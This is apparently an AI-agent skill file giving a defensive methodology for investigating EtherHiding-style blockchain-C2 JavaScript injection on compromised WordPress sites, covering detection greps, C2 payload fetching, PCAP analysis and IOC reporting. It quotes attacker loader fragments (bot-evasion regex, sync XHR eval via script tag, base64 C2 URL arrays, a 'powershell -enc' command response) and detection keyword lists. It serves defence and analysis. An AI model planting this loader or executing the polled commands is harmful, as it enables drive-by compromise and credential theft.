---
name: analyzing-etherhiding-blockchain-c2
description: >
  Full methodology for investigating EtherHiding-style blockchain-based C2 JavaScript injection attacks.
  Covers watering-hole WordPress compromise detection, blockchain dead drop analysis, ABI payload decode,
  obfuscated JS payload inspection, ClickFix C2 identification, PCAP kill-chain mapping,
  IOC extraction, MISP push, and report writing. Applies to any blockchain C2 variant —
  not limited to the EtherHiding label. Triggers on any site making eth_call, web3, or
  crypto RPC requests from a browser context.
domain: cybersecurity
subdomain: threat-intelligence
tags:
  - etherhiding
  - blockchain-c2
  - watering-hole
  - javascript-injection
  - clickfix
  - smart-contract
  - web3
  - wordpress-compromise
  - obfuscated-javascript
  - pcap-analysis
  - phishing
  - url-analysis
  - kill-chain
  - eth_call
  - blockchain
version: "1.0"
author: CyberHawk Threat Intelligence — Rudra Verma
license: Apache-2.0
mitre_techniques:
  - T1189   # Drive-by Compromise / Watering Hole
  - T1059.007 # JavaScript Execution
  - T1102.002 # Web Service — Blockchain Dead Drop
  - T1027   # Obfuscated Files / Information
  - T1204.001 # User Execution — ClickFix Social Engineering
  - T1219   # Remote Access Software (C2 polling)
  - T1555.003 # Credentials from Web Browsers
nist_csf:
  - DE.AE-02
  - RS.AN-03
  - ID.RA-01
  - DE.CM-01
---

# Analyzing EtherHiding / Blockchain-Based C2 JavaScript Injection

## Overview

EtherHiding is a watering-hole attack technique where threat actors:

1. Compromise a legitimate website (typically WordPress)
2. Inject a script that calls a blockchain smart contract via JSON-RPC (`eth_call`)
3. The contract stores a Base64-encoded JavaScript loader as its state
4. The loader contains obfuscated C2 URLs (double-encoded in Base64) pointing to a payload server
5. The payload server delivers a 1–2MB obfuscated JavaScript file (javascript-obfuscator `_0x` pattern)
6. A ClickFix social engineering overlay is displayed — victim runs a PowerShell cradle
7. A secondary C2 server collects stolen credentials via JSONP polling

**Critical rule:** Any website that makes `eth_call` JSON-RPC requests from a browser context is COMPROMISED. This is a definitive indicator. No legitimate business website calls a blockchain RPC endpoint.

**This skill covers ALL blockchain C2 variants**, not just EtherHiding:
- Different networks: BSC testnet, Base Sepolia, Ethereum mainnet, Polygon, Avalanche
- Different RPC endpoints: publicnode.com, infura.io, cloudflare-eth.com, alchemy.com, ankr.com
- Different obfuscators: javascript-obfuscator (`_0x`), custom, multi-stage loaders
- Different overlays: ClickFix, fake CAPTCHA, fake browser update, fake reCAPTCHA

---

## When to Use This Skill

**Phase 0 auto-triggers on any of these keywords in the URL investigation:**
`eth_call`, `blockchain`, `web3`, `smart-contract`, `contract`, `etherhiding`, `clickfix`,
`jsrepo`, `publicnode`, `infura`, `alchemy`, `ankr`, `watering-hole`, `0x[a-fA-F]{40}`

**Manually trigger when ANY of the following appear:**

In page source / scripts:
- `eth_call` in any JavaScript
- `0x[a-fA-F0-9]{40}` — 40-char hex (Ethereum contract address)
- `publicnode.com`, `infura.io`, `cloudflare-eth.com`, `alchemy.com`, `ankr.com`
- `web3`, `ethers`, `JsonRPC`, `jsonrpc` in a non-crypto site context
- Synchronous XHR: `.open("GET", url, !1)` or `.open("GET", url, false)`
- `document.createElement("script")` + `c.text = r.responseText` (eval via script tag)
- `atob(` decoding a large string → building a URL → XHR fetch
- Double-base64 URL arrays: `var n=["aHR0cHM6Ly8...","aHR0cHM6Ly8..."]`
- `_0x[a-z0-9]+` variable naming pattern (heavy obfuscation)

In network traffic (PCAP or proxy):
- `POST` body: `{"method":"eth_call","params":[{"to":"0x...","data":"0x6d4ce63c"}]}`
- `GET /jsrepo?rnd=FLOAT&ts=UNIX_MS` — repeated every 2–3 seconds
- `GET /index.php?callback=handleCmdCheck_TIMESTAMP&id=SESSION_ID` — ~1-second interval
- `{"executed":false}` or `{"executed":true,"cmd":"..."}` in HTTP response bodies

---

## Prerequisites

- Automated pipeline case folder exists (phases 0–7 completed)
- `tshark` v4+ (for PCAP analysis)
- `python3` (for ABI decode, base64/hex decode)
- `dig`, `whois`, `curl` (in cyberhawk-api container)
- MISP access for IOC push
- All skill files read BEFORE issuing any commands

---

## Mandatory Pre-Investigation Checklist

- [ ] Pipeline case folder exists: `/workspace/investigations/YYYY-MM-DD/<slug>/`
- [ ] `applicable_skills.json` read — this skill is confirmed loaded
- [ ] `page_analysis.json` read — external scripts list captured
- [ ] `page_source.html` saved and available
- [ ] `iocs.json` from pipeline reviewed
- [ ] MISP searched for all domains and resolved IPs
- [ ] Default stance set to **SUSPICIOUS** — never presumed clean

---

## Investigation Phases

### PHASE 1 — Read Automated Pipeline Output (NEVER SKIP)

The pipeline runs automatically on every URL submission. It produces:
- `applicable_skills.json` — skills matched in Phase 0
- `page_analysis.json` — all scripts, iframes, forms, external links
- `page_source.html` — full raw HTML
- `iocs.json` — auto-extracted IPs, URLs, domains, emails
- `dns_records.json` — A/MX/TXT/NS/CNAME
- `whois.txt` — registration data
- `tls_cert.json` — certificate info
- `http_response.json` — status, headers, redirect chain

**Read ALL of these before running any manual command. Save the read output to commands.log.**

```bash
cat /workspace/investigations/YYYY-MM-DD/<slug>/page_analysis.json
cat /workspace/investigations/YYYY-MM-DD/<slug>/iocs.json
cat /workspace/investigations/YYYY-MM-DD/<slug>/http_response.json
```

Key fields in `page_analysis.json` to check:
- `external_scripts` — fetch and inspect EVERY URL listed here
- `form_count` — credential harvesting forms
- `iframe_count` — suspicious embeds
- `inline_scripts` — check each one for eval/atob patterns

---

### PHASE 2 — Inspect page_source.html for Injection Signatures

Grep for all EtherHiding-specific patterns:

```bash
# Blockchain / Web3 indicators
grep -n "eth_call\|eth_getStorageAt\|eth_getCode\|eth_getLogs" page_source.html
grep -n "0x[a-fA-F0-9]\{40\}" page_source.html
grep -n "publicnode\|infura\.io\|cloudflare-eth\|alchemy\|ankr\.com\|bscscan\|polygonscan" page_source.html
grep -n "jsonrpc\|web3\|ethers\|JsonRPC" page_source.html

# Eval and loader patterns
grep -n "atob(" page_source.html
grep -n "XMLHttpRequest\|\.open.*!1\|\.open.*false" page_source.html
grep -n "createElement.*script\|responseText.*trim\|head\.append" page_source.html
grep -n "_0x[a-z0-9]\{4,\}" page_source.html

# ClickFix / social engineering overlay
grep -n "handleCmdCheck\|executed.*false\|executed.*true\|Win+R\|Ctrl+V\|powershell\|clipboard" page_source.html

# CSS injection / SEO spam (different threat, still check)
grep -n "position.*absolute.*top.*-9999\|display.*none" page_source.html

# Hidden iframes
grep -n "<iframe" page_source.html
```

**Save all grep output to commands.log. Even null output must be logged.**

---

### PHASE 3 — Fetch and Inspect Every External Script

For every URL in `external_scripts`:

```bash
# Fetch and save the script
curl -sL "SCRIPT_URL" \
  -o /workspace/investigations/YYYY-MM-DD/<slug>/scripts/<safe_filename>.js \
  -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

# Note size
wc -c /path/to/script.js

# Check for EtherHiding indicators
grep -c "eth_call\|web3\|infura\|publicnode\|atob\|_0x\|createElement\|handleCmdCheck\|XMLHttpRequest" script.js
grep -n "eth_call\|0x[a-fA-F0-9]\{40\}" script.js
grep -n "atob\|btoa" script.js
grep -n "XMLHttpRequest\|\.open.*false\|\.open.*!1" script.js
```

**Priority scripts to inspect:**
- `custom.js` in WordPress child themes — most common injection target
- Plugin JS from RevSlider, WP Bakery/Composer, Contact Form 7
- Any script loaded from an IP address rather than a domain name
- Any script from a domain NOT in the WP plugin/theme ecosystem
- Minified scripts with unusual names (`gW3r.js`, `cdnload.js`, random strings)

**If any script is >100KB with `_0x` variables → it IS the obfuscated payload. Save it fully and document size.**

---

### PHASE 4 — Identify the Blockchain Contract

When `eth_call` is confirmed, extract from the POST body:

```
{"jsonrpc":"2.0","method":"eth_call","params":[{"to":"CONTRACT_ADDR","data":"SELECTOR"},"latest"],"id":N}
```

**Common function selectors:**
| Selector | Function | Notes |
|---|---|---|
| `0x6d4ce63c` | `get()` | Most common EtherHiding pattern |
| `0x2e64cec1` | `retrieve()` | Variation — same pattern |
| `0x893d20e8` | `getOwner()` | Used in some variants |

**Verify the contract directly:**

```bash
# BSC testnet (most common)
curl -s -X POST "https://bsc-testnet-rpc.publicnode.com" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_call","params":[{"to":"CONTRACT_ADDR","data":"0x6d4ce63c"},"latest"],"id":1}' \
  -o /workspace/investigations/YYYY-MM-DD/<slug>/blockchain_rpc_response.json

cat blockchain_rpc_response.json

# Ethereum mainnet
curl -s -X POST "https://eth.llamarpc.com" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_call","params":[{"to":"CONTRACT_ADDR","data":"0x6d4ce63c"},"latest"],"id":1}'
```

**Record:**
- Contract address (0x... 40-char hex)
- Function selector (4-byte hex)
- RPC endpoint domain and resolved IP
- Blockchain network (BSC testnet / Base / ETH mainnet / Polygon)

---

### PHASE 5 — Decode the Blockchain Payload (ABI Decode)

The `result` field in the eth_call response is ABI-encoded. Use the provided script:

```bash
# Copy decode script to case folder and run it
python3 /path/to/skill/scripts/abi_decode.py
# OR use the quick one-liner from references/abi-decode.md
```

See `references/abi-decode.md` for the full decode script and edge cases.

**Document in `blockchain_decoded_payload.js`:**
- Annotate each section (bot evasion block, URL array, XHR loader, eval injection)
- Mark which C2 URLs are primary vs. fallback

---

### PHASE 6 — Analyse the Loader JavaScript

The decoded payload is the EtherHiding loader. Key sections to document:

**Bot / scanner evasion regex:**
```javascript
if(/bot|crawl|slurp|spider|baidu|ahrefs|mj12bot|semrush|screaming|phantomjs|curl|wget|python|java/i.test(t)
  ||-1!==a.indexOf("/wp-json")
  ||/wp-login\.php|wp-admin|wp-includes|xmlrpc|wp-json|robots\.txt/i.test(r))
  return;
```

**Double-base64 C2 URL array:**
```javascript
var n=[
  "<BASE64_PRIMARY_C2_URL>",    // primary C2 — decodes to https://<domain>/jsrepo?rnd=
  "<BASE64_BACKUP_C2_URL>",     // backup C2 — same pattern, different domain
];
```

**Synchronous XHR → eval via script tag:**
```javascript
var r=new XMLHttpRequest;
r.open("GET",a,!1);  // !1 = false = SYNCHRONOUS
r.send(null);
var c=document.createElement("script");
c.text=r.responseText.trim();
document.head.appendChild(c);  // eval equivalent
```

---

### PHASE 7 — Fetch and Analyse the C2 Payload (jsrepo)

```bash
# Fetch with cache-busting params
curl -sL "https://C2DOMAIN/jsrepo?rnd=$(python3 -c 'import random; print(random.random())')&ts=$(date +%s%3N)" \
  -o /workspace/investigations/YYYY-MM-DD/<slug>/jsrepo_payload_full.js \
  -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Document size (expect 1–2MB)
wc -c jsrepo_payload_full.js

# Save sample
head -c 5000 jsrepo_payload_full.js > jsrepo_payload_sample.js

# Check key indicators inside obfuscated payload
strings jsrepo_payload_full.js | grep -E "ServiceWorker|register|sw\.js" | head -10
strings jsrepo_payload_full.js | grep -E "Win\+R|Ctrl\+V|powershell|clipboard" | head -10
strings jsrepo_payload_full.js | grep -E "https?://[a-z0-9.-]+/" | sort -u | head -20
strings jsrepo_payload_full.js | grep -E "handleCmdCheck|executed|clickfix" | head -10
```

**Key patterns to look for:**
| Pattern | Meaning |
|---|---|
| `ServiceWorker` / `register` | Persistence — survives page close |
| `navigator.clipboard` / `Win+R` / `Ctrl+V` | ClickFix overlay stage |
| `handleCmdCheck_` | JSONP C2 polling callback name |
| `clickfix_exfil` | Credential exfiltration endpoint |
| `_0x[a-z0-9]{4,}` | javascript-obfuscator pattern |

---

### PHASE 8 — Identify and Test the ClickFix C2

The ClickFix C2 uses JSONP polling — browser-compatible, no CORS issues.

**JSONP URL pattern:**
```
http://C2DOMAIN/index.php?callback=handleCmdCheck_UNIX_MILLISECONDS&id=SESSION_ID
```

```bash
# Check if C2 is live and responding
SESSION="$(date +%s%3N)-testcheck"
curl -sL "http://C2DOMAIN/index.php?callback=handleCmdCheck_${SESSION}&id=test-analyst-id" \
  -o /workspace/investigations/YYYY-MM-DD/<slug>/c2_poll_response.json
cat c2_poll_response.json

# Expected responses:
# handleCmdCheck_TIMESTAMP({"executed":false});      ← no active command
# handleCmdCheck_TIMESTAMP({"executed":true,"cmd":"powershell -enc BASE64"});  ← ACTIVE
```

---

### PHASE 9 — PCAP Analysis (when decrypted PCAP is available)

See `references/pcap-commands.md` for the full tshark command library.

**Quick sequence:**
```bash
# Step 1: Overview
capinfos FILE.pcap

# Step 2: Full HTTP host map
tshark -r FILE.pcap -Y "http.request" \
  -T fields -e frame.time_relative -e ip.dst -e http.host \
  -e http.request.method -e http.request.uri | sort -u

# Step 3: Blockchain RPC POST body
tshark -r FILE.pcap -Y "ip.addr==RPC_IP && http.request.method==POST" \
  -T fields -e frame.time_relative -e http.file_data | head -5

# Step 4: ClickFix polling
tshark -r FILE.pcap -Y "ip.addr==CLICKFIX_IP && http.request" \
  -T fields -e frame.time_relative -e http.request.uri | head -20
```

**Save ALL tshark output to commands.log per Rule 0.**

---

### PHASE 10 — Kill Chain Documentation

Document each confirmed stage with timing, network evidence, and decoded content:

| Stage | Timing | Event | Network Evidence |
|---|---|---|---|
| 1 — Watering Hole | T+0s | Victim visits compromised WordPress site | HTTP GET victim domain |
| 2 — Script Injection | T+Xs | Injected custom.js executes | GET /wp-content/themes/*/custom.js |
| 3 — Blockchain Dead Drop | T+Xs | eth_call to contract via RPC | POST to RPC endpoint |
| 4 — ABI Decode + Eval | T+Xs | Contract payload decoded → eval via script tag | RPC 200 response |
| 5 — C2 Beacon | T+Xs, 2–3s | Service Worker polls /jsrepo | GET /jsrepo?rnd=FLOAT&ts=UNIX_MS |
| 6 — ClickFix C2 Poll | T+Xs, 1s | JSONP polling for command | GET /index.php?callback=handleCmdCheck_TS |
| 7 — Command Issued | T+Xs | {executed:true} — PowerShell cradle | Response body |
| 8 — Credential Exfil | T+Xs | Credentials POSTed to C2 | POST /clickfix_exfil |

---

### PHASE 11 — IOC Extraction and Classification

**IOC types for this threat family (use exact MISP attr_type values):**

| IOC Type | MISP attr_type | to_ids | Notes |
|---|---|---|---|
| Compromised victim domain | `domain` | FALSE | Do NOT block — legitimate site |
| C2 payload server domain | `domain` | TRUE | BLOCK |
| Backup C2 domain | `domain` | TRUE | BLOCK |
| ClickFix C2 domain | `domain` | TRUE | BLOCK |
| Blockchain RPC domain | `domain` | FALSE | Legitimate infra — do NOT block |
| C2 payload server IP | `ip-dst` | TRUE | BLOCK |
| ClickFix C2 IP | `ip-dst` | TRUE | BLOCK |
| Victim site IP | `ip-dst` | FALSE | Do NOT block |
| jsrepo payload URL | `url` | TRUE | BLOCK |
| ClickFix C2 polling URL | `url` | TRUE | BLOCK |
| Contract address | `text` | FALSE | Monitor on-chain |
| Function selector | `text` | FALSE | Detection context |
| MITRE mappings | `text` | FALSE | Analysis context |

**Defang rules for reports:** `https://` → `hxxps://` | `.` → `[.]` | `@` → `[@]`

---

### PHASE 12 — MISP Push and Publish

```
1. misp_create_event — title, distribution:0, analysis:2, threat_level:2
2. misp_add_attribute — use attr_type (NOT type), add ALL IOCs
3. misp_tag_event — tag: tlp:amber
4. misp_publish_event — DO NOT leave as draft
5. Update iocs.json — write MISP event ID to TOP of file
```

---

### PHASE 13 — Write report.md (MANDATORY FINAL STEP)

Required sections:
```
# Incident Report — EtherHiding Blockchain C2
Reference / Date / Analyst / Classification / Severity / MISP Event

## Executive Summary
## Target Details (table)
## Kill Chain Narrative (stage by stage with timestamps)
## C2 Infrastructure (table)
## IOCs — ALL DEFANGED (table)
## MITRE ATT&CK Mapping (table)
## Detection Recommendations (network / endpoint / threat intel)
## Limitations
## References
```

**Do NOT produce HTML unless explicitly asked.**

---

## Verdict Decision Rules

| Condition | Verdict |
|---|---|
| `eth_call` found in ANY script loaded by the page | **COMPROMISED — EtherHiding** |
| Blockchain RPC POST in network traffic from browser | **COMPROMISED — EtherHiding** |
| `atob(` → sync XHR → `createElement("script")` chain | **COMPROMISED — JavaScript Loader** |
| `handleCmdCheck_` JSONP polling found in traffic | **COMPROMISED — ClickFix C2 active** |
| `_0x` obfuscated 1MB+ JS served from unknown domain | **MALICIOUS PAYLOAD** |
| Contract confirmed on-chain returning JS payload | **BLOCKCHAIN DEAD DROP CONFIRMED** |
| All scripts verified clean — MISP clean | **FALSE POSITIVE** |

**A site that looks legitimate is NOT evidence of clean. Compromised sites ARE legitimate sites.**
**Never render FP from surface appearance alone.**

---

## Key Evasion Patterns

| Evasion Technique | Detection Method |
|---|---|
| Bot UA fingerprint | Regex: `bot\|crawl\|slurp\|spider\|phantomjs\|curl\|wget\|python` |
| WP admin path blocklist | Regex: `wp-login\.php\|wp-admin\|wp-includes\|xmlrpc\|wp-json` |
| Cache-busting params | `?rnd=Math.random()&ts=Date.now()` on every request |
| Double base64 C2 URLs | URL array, each base64-encoded, inside base64-encoded payload |
| Synchronous XHR | `.open("GET", url, false)` or `.open("GET", url, !1)` |
| Script tag eval | `createElement("script"); c.text = responseText; head.appendChild(c)` |
| Blockchain as dead drop | C2 URL never in WP source — only via eth_call |
| JSONP for C2 polling | `?callback=FUNCTION_NAME` — bypasses same-origin restrictions |
| javascript-obfuscator | `_0x[a-z0-9]+` variables, control-flow flattening, string rotation |

---

## Artifacts Checklist — Must All Exist Before Closing

- [ ] `commands.log` — every command and full stdout/stderr
- [ ] `applicable_skills.json` — Phase 0 output
- [ ] `page_source.html` / `page_analysis.json` / `iocs.json` — pipeline output
- [ ] `scripts/<name>.js` — every external script fetched
- [ ] `blockchain_rpc_response.json` — raw eth_call response
- [ ] `blockchain_decoded_payload.js` — decoded + annotated loader JS
- [ ] `jsrepo_payload_sample.js` + `jsrepo_payload_full.js`
- [ ] `c2_poll_response.json` — ClickFix JSONP response
- [ ] `iocs.json` — all IOCs with MISP event ID at top
- [ ] `notes.md` — analyst log
- [ ] `report.md` — final incident report

If PCAP available, also: `pcap_tcp_conversations.txt`, `pcap_http_hosts.txt`,
`pcap_rpc_requests.txt`, `pcap_rpc_responses.txt`, `pcap_jsrepo_sample.txt`, `pcap_c2_responses.txt`

---

## References

- `references/attack-patterns.md` — Full kill chain breakdown, annotated loader, variant detection, WP injection points, infrastructure fingerprints, detection logic
- `references/pcap-commands.md` — Full tshark command library for PCAP analysis with Python decoders
- `references/abi-decode.md` — ABI structure explanation, full Python decode script, 5 edge cases, worked example
- `scripts/abi_decode.py` — Copy-paste ready ABI decode script for field use
